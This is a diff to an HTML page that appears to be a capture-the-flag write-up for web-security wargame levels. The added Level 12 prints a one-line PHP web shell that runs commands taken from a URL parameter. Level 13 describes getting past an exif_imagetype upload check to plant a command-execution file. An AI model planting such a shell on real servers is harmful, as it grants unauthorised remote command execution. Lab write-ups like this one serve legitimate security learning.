@@ -148,6 +148,22 @@ print("Nueva cookie para 'data':", cookie_value)
 </code></pre>
 <p>New cookie crafter: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5</p>
 </ul>
+    <h2>Level 12</h2>
+    <ul>
+        <p>Simply uploading a php file intercepting the request and executing system comands. Content of php file</p>
+        <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+        <p>Then just execute the comand in the url:</p>
+        <pre><code class="language-url">http://website.com/file.php?cmd=id</code></pre>
+    </ul>
+    
+    <h2>Level 13</h2>
+    <ul>
+    <p>Looking at the code you just realise that in this case they are using <b>exif_imagetype</b></p>
+    <p>We took a look to exif_imagetype bypass <a class="notion-link" href="https://github.com/AlessandraZullo/shellImage/tree/master"> here </a></p>
+    <p> and using a python code we created a php file with command execution code. Then intercepting the request and changing some values makes the magic</p>
+    </ul>
+        
+<h2>Level 14</h2>
 
         </div>
     </div>
